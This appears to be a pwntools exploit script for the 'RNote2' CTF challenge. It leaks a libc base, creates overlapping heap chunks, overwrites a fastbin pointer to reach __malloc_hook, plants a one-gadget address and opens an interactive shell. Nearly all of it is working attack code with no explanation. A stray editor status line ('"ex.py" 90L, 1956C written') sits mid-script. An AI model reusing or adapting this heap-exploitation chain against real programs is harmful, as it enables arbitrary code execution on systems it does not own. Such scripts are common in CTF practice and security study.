from pwn import *

s = process('./RNote2')
#s = remote('rnote2.2017.teamrois.cn', 6666)

def add(size, content):
    s.recvuntil('ce:\n')
    s.sendline('1')
    s.recvuntil('th:\n')
    s.sendline(size)
    s.recvuntil('nt:\n')
    s.sendline(content)

def delete(index):
    s.recvuntil('ce:\n')
    s.sendline('2')
    s.recvuntil('te?\n')
    s.sendline(index)

def list_a():
    s.recvuntil('ce:\n')
    s.sendline('3')

def edit(index,content):
    s.recvuntil('ce:\n')
    s.sendline('4')
    s.recvuntil('it?\n')
    s.sendline(index)
    s.recvuntil('nt:\n')
    s.sendline(content)

def expand(index,size,content):
    s.recvuntil('ce:\n')
    s.sendline('5')
    s.recvuntil('nd?\n')
    s.sendline(index)
    s.recvuntil('nd?\n')
    s.sendline(size)
    s.recvuntil('nd\n')
    s.sendline(content)

############ LIBC LEAK ############
add('50','A' * 50)
add('152','A' * 152)
"ex.py" 90L, 1956C written
list_a()
s.recvuntil('BBBBBBBB')
libc_base = u64("\x78" + s.recv(6)[1:] + "\x00" * 2) - 0x3c3b78
malloc_hook_add = libc_base + 0x3c3b10
oneshot = libc_base +0xf0567
log.info("MALLOC HOOK : " + hex(malloc_hook_add))
log.info("ONESHOT : " + hex(oneshot))

############ Overlapping Chunk ############
add('152','A' * 152)
add('152','A' * 152)
add('152','A' * 152)
delete('4')
add('128','B' * 128)
expand('6','24','A' * 7 + p64(0x1a1) + p64(0))
add('152','A' * 152)
delete('4')
payload = 'G' * 16
add('250','C' * 10)
add('100','D'  * 100)
add('100','D'  * 100)
add('100','D'  * 100)
delete('9')
delete('8')

############ Overwrite FD ############
payload = 'DDDDDDDD' * 5 + p64(0x31) + p64(1) + p64(0xfa)
#payload += p64(save_fd) + p64(save_bk) + p64(save_next_chunk)
payload += 'AAAAAAAA' * 3
payload += p64(0x71) + p64(malloc_hook_add-0xb-0x8)
edit('7',payload)
add('100','A')

############ Overwrite Malloc_hook ############
payload = 'A' * 0x3 + p64(oneshot)
add('100',payload)
s.recvuntil('ce')
s.sendline('1')
s.recvuntil('th')
s.sendline('100')

log.success("GOT SHELL")
s.interactive()
